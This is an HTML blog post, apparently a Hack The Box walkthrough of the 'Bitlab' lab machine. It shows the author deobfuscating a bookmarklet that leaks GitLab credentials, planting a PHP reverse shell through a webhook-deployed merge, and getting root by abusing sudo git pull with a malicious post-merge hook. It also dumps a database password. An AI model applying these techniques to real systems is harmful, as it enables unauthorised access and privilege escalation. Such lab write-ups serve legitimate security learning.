@@ -1,0 +1,212 @@
+<!doctype html><html lang=en-us><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><style type=text/css>body{font-family:monospace}</style><meta name=description content="
+
+
+Quick Summary
+First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path."><meta name=keywords content="linux,htb-medium,php,rce,git,web,ssh,sudo"><meta name=categories content="Hack the Box"><title>Hack The Box - Bitlab | Ceso Adventures</title><link rel=stylesheet href=https://ceso.github.io/css/smigle-lagom.css><link rel=icon href=data:image/png,><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
+|
+<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
+|
+<a href=https://ceso.github.io/posts/><b>Posts</b></a>
+|
+<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
+|
+<a href=https://ceso.github.io/resources><b>Resources</b></a>
+|
+<a href=https://ceso.github.io/videos><b>Videos</b></a>
+|
+<a href=https://ceso.github.io/categories/><b>Categories</b></a>
+|
+<a href=https://ceso.github.io/tags/><b>Tags</b></a>
+|
+<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div id=content><main><article><h1 class=title>Hack The Box - Bitlab</h1><div class=post-meta><strong><span>Posted on</span>
+<time>2020-01-11</time>
+<span>in</span>
+<a href=https://ceso.github.io/categories/hack-the-box>Hack the Box</a></strong><div><span>Tags:</span>
+<a href=https://ceso.github.io/tags/linux>linux</a>,
+<a href=https://ceso.github.io/tags/htb-medium>htb-medium</a>,
+<a href=https://ceso.github.io/tags/php>php</a>,
+<a href=https://ceso.github.io/tags/rce>rce</a>,
+<a href=https://ceso.github.io/tags/git>git</a>,
+<a href=https://ceso.github.io/tags/web>web</a>,
+<a href=https://ceso.github.io/tags/ssh>ssh</a>,
+<a href=https://ceso.github.io/tags/sudo>sudo</a></div></div><pre class=asciitoc>.
+├── <a href=#quick-summary>Quick Summary</a>
+├── <a href=#nmap>Nmap</a>
+├── <a href=#web-enumeration>Web enumeration</a>
+├── <a href=#rce---www-data---root>RCE -> www-data -> root</a>
+├── <a href=#beyond-root>Beyond root</a>
+└── <a href=#user>User</a>
+</pre><div class=content><img src=https://ceso.github.io/images/htb/bitlab/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the <code>sudo + git</code> path as I&rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</p><p>This was a cool box, not hard at the technical level, but one that required to enumerate a lot, so pretty cool to get better at that!</p><p>Said that, let&rsquo;s get our hands dirty :D</p><h2 id=nmap>Nmap</h2><p>We start running nmap to get which ports/services are being exposed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+</span></span><span style=display:flex><span>Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
+</span></span><span style=display:flex><span>Nmap scan report for bitlab.htb (10.10.10.114)
+</span></span><span style=display:flex><span>Host is up (0.019s latency).
+</span></span><span style=display:flex><span>Not shown: 998 filtered ports
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+</span></span><span style=display:flex><span>|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+</span></span><span style=display:flex><span>|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx
+</span></span><span style=display:flex><span>| http-robots.txt: 55 disallowed entries (15 shown)
+</span></span><span style=display:flex><span>| / /autocomplete/users /search /api /admin /profile 
+</span></span><span style=display:flex><span>| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+</span></span><span style=display:flex><span>|_/s/ /snippets/new /snippets/*/edit
+</span></span><span style=display:flex><span>| http-title: Sign in \xC2\xB7 GitLab
+</span></span><span style=display:flex><span>|_Requested resource was http://bitlab.htb/users/sign_in
+</span></span><span style=display:flex><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
+</span></span><span style=display:flex><span>No exact OS matches for host (test conditions non-ideal).
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap <span style=color:#66d9ef>done</span> at Thu Dec <span style=color:#ae81ff>12</span> 22:34:15 <span style=color:#ae81ff>2019</span> -- <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 17.39 seconds
+</span></span></code></pre></div><p>And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is <a href=https://gitlab.com/>Gitlab</a>.</p><h2 id=web-enumeration>Web enumeration</h2><p>The home page (<code>http://10.10.10.114/</code>), is just the standard login page which bitlab has:</p><img src=https://ceso.github.io/images/htb/bitlab/1.1-web_enum.png class=center style=border-radius:8px><p>We try the links in this page and check if they are working, with it we found <code>Help</code> it is, and we are redirected to a directory listing having a <code>bookmarks.html</code> and open it:</p><img src=https://ceso.github.io/images/htb/bitlab/1.2-web_enum.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/bitlab/1.3-web_enum.png class=center style=border-radius:8px><p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href=https://lelinhtinh.github.io/de4js/>de4js</a> but any deobfuscation tool or even a python console will do it):</p><p>From the code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span>(<span style=color:#66d9ef>function</span>(){ <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style=color:#e6db74>&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style=color:#e6db74>&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style=color:#e6db74>&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>]; })()
+</span></span></code></pre></div><p>We get the following code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span> (<span style=color:#66d9ef>function</span> () {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;user_login&#34;</span>, <span style=color:#e6db74>&#34;getElementById&#34;</span>, <span style=color:#e6db74>&#34;clave&#34;</span>, <span style=color:#e6db74>&#34;user_password&#34;</span>, <span style=color:#e6db74>&#34;11des0081x&#34;</span>];
+</span></span><span style=display:flex><span>    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];
+</span></span><span style=display:flex><span>    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>];
+</span></span><span style=display:flex><span>})()
+</span></span></code></pre></div><p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p><img src=https://ceso.github.io/images/htb/bitlab/1.5-web_enum.png class=center style=border-radius:8px><p>Taking a deepest look into <code>Profile</code> we find that this project has <a href=https://docs.gitlab.com/ee/topics/autodevops/>Auto DevOps</a> enabled.
+We continue enumerating a bit more, and see that the project called <code>Deployer</code> is in charge to manage to do that: deploy the applications, in the description is given a link pointing to the we take a look into the documentation of <a href=https://docs.gitlab.com/ee/user/project/integrations/webhooks.html>webhooks</a> gitlab has, after it we take a look into <code>index.php</code> to see what it does:</p><img src=https://ceso.github.io/images/htb/bitlab/1.6-web_enum.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/bitlab/1.7-web_enum.png class=center style=border-radius:8px><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#34;php://input&#34;</span>);
+</span></span><span style=display:flex><span>$payload  <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_decode</span>($input);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$repo <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>project</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>$event <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>event_type</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>$state <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>object_attributes</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>state</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>$branch <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>object_attributes</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>target_branch</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($repo<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;Profile&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $branch<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;master&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $event<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;merge_request&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $state<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;merged&#39;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#39;cd ../profile/; sudo git pull&#39;</span>),<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;OK</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span></code></pre></div><p>Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of <code>index.php</code> specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute <code>index.php</code> from <code>Deployer</code> with this we will have our reverse shell uploaded to server.</p><h2 id=rce---www-data---root>RCE -> www-data -> root</h2><p>We upload the next <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>php reverse shell by pentestmonkey</a> changing <code>$ip = '127.0.0.1'</code> and <code>$port = 1234</code> to our ip and the port we will be listening in our machine, afterwards we merge it (we will be automatically redirected to the page for merging it).</p><p>Now, the reverse shell is uploaded, but we still need to execute it, for that is needed to know which one is the path to execute it, if we remember the project <code>Deployer</code> has it&rsquo;s index.php which will print an &ldquo;OK&rdquo; we could try to access the path of deployer and see if it is printed, if it is, then we know that the path for our reverse shell will be <code>http://10.0.0.14/profile/&lt;name of our reverse shell></code>:</p><img src=https://ceso.github.io/images/htb/bitlab/1.rce.png class=center style=border-radius:8px><p>Now we know that indeed that the mentioned url above will be the one wee need to use.
+We run the listener for our reverse shell and execute it, with it having our rce:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+</span></span><span style=display:flex><span>listening on [any] 1234 ...
+</span></span><span style=display:flex><span>connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
+</span></span><span style=display:flex><span>Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+</span></span><span style=display:flex><span> 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
+</span></span><span style=display:flex><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style=display:flex><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span><span style=display:flex><span>/bin/sh: 0: can&#39;t access tty; job control turned off
+</span></span><span style=display:flex><span>$ python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style=display:flex><span>www-data@bitlab:/var/www$ pwd
+</span></span><span style=display:flex><span>pwd
+</span></span><span style=display:flex><span>/var/www
+</span></span></code></pre></div><p>We check if we have sudo rights, where is the home of www-data and what we found there:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>www-data@bitlab:/var/www$ sudo -l
+</span></span><span style=display:flex><span>sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries for www-data on bitlab:
+</span></span><span style=display:flex><span>    env_reset, exempt_group=sudo, mail_badpass,
+</span></span><span style=display:flex><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>User www-data may run the following commands on bitlab:
+</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/bin/git pull
+</span></span><span style=display:flex><span>www-data@bitlab:/var/www$ getent passwd www-data
+</span></span><span style=display:flex><span>getent passwd www-data
+</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style=display:flex><span>www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
+</span></span><span style=display:flex><span>cd /var/www/html/profile
+</span></span><span style=display:flex><span>www-data@bitlab:/var/www/html/profile$ ls -la
+</span></span><span style=display:flex><span>ls -la
+</span></span><span style=display:flex><span>total 144
+</span></span><span style=display:flex><span>drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
+</span></span><span style=display:flex><span>drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
+</span></span><span style=display:flex><span>drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
+</span></span><span style=display:flex><span>-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
+</span></span><span style=display:flex><span>-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
+</span></span><span style=display:flex><span>-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
+</span></span><span style=display:flex><span>-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
+</span></span><span style=display:flex><span>-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
+</span></span></code></pre></div><p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href=https://git-scm.com/docs/githooks#_post_merge>hooks: post merge</a> and the one for <a href=https://git-scm.com/docs/git-pull>git pull</a>.</p><p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+</span></span><span style=display:flex><span>cp -r profile /tmp/profile
+</span></span><span style=display:flex><span>www-data@bitlab:/tmp/profile$ ls -la
+</span></span><span style=display:flex><span>ls -la
+</span></span><span style=display:flex><span>total 148
+</span></span><span style=display:flex><span>drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
+</span></span><span style=display:flex><span>drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
+</span></span><span style=display:flex><span>drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
+</span></span><span style=display:flex><span>drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
+</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
+</span></span></code></pre></div><p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>www-data@bitlab:/tmp/profile$ cd .git/hooks
+</span></span><span style=display:flex><span>cd .git/hooks
+</span></span><span style=display:flex><span>www-data@bitlab:/tmp/profile/.git/hooks$ echo &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
+</span></span><span style=display:flex><span>&lt; &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
+</span></span><span style=display:flex><span>www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
+</span></span><span style=display:flex><span>chmod u+x post-merge
+</span></span></code></pre></div><p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>www-data@bitlab:/tmp/profile$ sudo git pull
+</span></span><span style=display:flex><span>sudo git pull
+</span></span><span style=display:flex><span>remote: Enumerating objects: 4, done.
+</span></span><span style=display:flex><span>remote: Counting objects: 100% (4/4), done.
+</span></span><span style=display:flex><span>remote: Compressing objects: 100% (3/3), done.
+</span></span><span style=display:flex><span>Unpacking objects: 100% (3/3), done.
+</span></span><span style=display:flex><span>remote: Total 3 (delta 2), reused 0 (delta 0)
+</span></span><span style=display:flex><span>From ssh://localhost:3022/root/profile
+</span></span><span style=display:flex><span>   35da5b2..cbbc729  master     -&gt; origin/master
+</span></span><span style=display:flex><span> * [new branch]      patch-2    -&gt; origin/patch-8
+</span></span><span style=display:flex><span>Updating 35da5b2..cbbc729
+</span></span><span style=display:flex><span>Fast-forward
+</span></span><span style=display:flex><span> 1asf | 1 +
+</span></span><span style=display:flex><span> 1 file changed, 1 insertion(+)
+</span></span><span style=display:flex><span> create mode 100644 1asf
+</span></span><span style=display:flex><span>root@bitlab:/tmp/profile# id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style=display:flex><span>root@bitlab:/tmp/profile# cd /root    
+</span></span><span style=display:flex><span>cd /root
+</span></span><span style=display:flex><span>root@bitlab:~# ls   
+</span></span><span style=display:flex><span>ls 
+</span></span><span style=display:flex><span>root.txt
+</span></span><span style=display:flex><span>root@bitlab:~# wc -c root.txt
+</span></span><span style=display:flex><span>wc -c root.txt
+</span></span><span style=display:flex><span>33 root.txt
+</span></span></code></pre></div><p>With this we can already go to <code>/home</code> and see from there which user and it&rsquo;s respective flag.</p><h2 id=beyond-root>Beyond root</h2><p>Ok, as I said at the begining of the post, there are 2 paths to get this box:</p><p>1 - Intended way (user -> root) by doing reversing.
+2 - Taking advantage of this misconfigurations.</p><p>I will go now into the 1, but I will only cover how to get user, and in the future once I know some reversing, I will post the last piece.</p><h2 id=user>User</h2><p>In the home page of the Profile project, there is a hint, is mentioned a connection postgresql and snippets, we go to the snippets page, and we found we have one</p><img src=https://ceso.github.io/images/htb/bitlab/1-intended_user.png class=center style=border-radius:8px><p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$db_connection</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_connect</span>(<span style=color:#e6db74>&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_query</span>(<span style=color:#a6e22e>$db_connection</span>, <span style=color:#e6db74>&#34;SELECT * FROM profiles&#34;</span>);
+</span></span></code></pre></div><p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$db_connection</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_connect</span>(<span style=color:#e6db74>&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_query</span>(<span style=color:#a6e22e>$db_connection</span>, <span style=color:#e6db74>&#34;SELECT * FROM profiles&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$arr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_fetch_all</span>(<span style=color:#a6e22e>$result</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>print_r</span>(<span style=color:#a6e22e>$arr</span>);
+</span></span></code></pre></div><p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script></code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>Array ( [<span style=color:#ae81ff>0</span>] =&gt; Array ( [<span style=color:#a6e22e>id</span>] =&gt; <span style=color:#ae81ff>1</span> [<span style=color:#a6e22e>username</span>] =&gt; <span style=color:#a6e22e>clave</span> [<span style=color:#a6e22e>password</span>] =&gt; <span style=color:#a6e22e>c3NoLXN0cjBuZy1wQHNz</span><span style=color:#f92672>==</span> ) )
+</span></span></code></pre></div><p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+</span></span><span style=display:flex><span>clave@10.10.10.114&#39;s password: 
+</span></span><span style=display:flex><span>Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
+</span></span><span style=display:flex><span>clave@bitlab:~$ id
+</span></span><span style=display:flex><span>uid=1000(clave) gid=1000(clave) groups=1000(clave)
+</span></span><span style=display:flex><span>clave@bitlab:~$ ls -la
+</span></span><span style=display:flex><span>total 44
+</span></span><span style=display:flex><span>drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
+</span></span><span style=display:flex><span>drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
+</span></span><span style=display:flex><span>lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
+</span></span><span style=display:flex><span>drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
+</span></span><span style=display:flex><span>drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
+</span></span><span style=display:flex><span>-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
+</span></span><span style=display:flex><span>-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
+</span></span><span style=display:flex><span>-r-------- 1 clave clave    33 Feb 28  2019 user.txt
+</span></span><span style=display:flex><span>clave@bitlab:~$ wc -c user.txt 
+</span></span><span style=display:flex><span>33 user.txt
